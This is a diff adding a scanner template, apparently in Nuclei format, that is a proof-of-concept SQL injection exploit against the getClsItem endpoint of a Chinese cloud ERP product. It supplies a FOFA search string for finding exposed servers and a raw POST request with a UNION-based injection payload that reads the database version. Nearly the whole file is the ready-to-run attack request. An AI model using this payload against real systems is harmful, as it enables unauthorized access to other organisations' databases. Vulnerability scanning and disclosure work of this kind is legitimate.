@@ -1,0 +1,34 @@
+id: poc-soeql96l6032aege
+info:
+  name: 中科商软云连ERP管理系统 getClsItem 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/soeql96l6032aege'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: soeql96l6032aege
+    fofa: title="Powered By chaosZ"
+http:
+- raw:
+  - 'POST /gateway/user_defined_cls!getClsItem.action HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+
+    id=1'') UNION ALL SELECT @@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
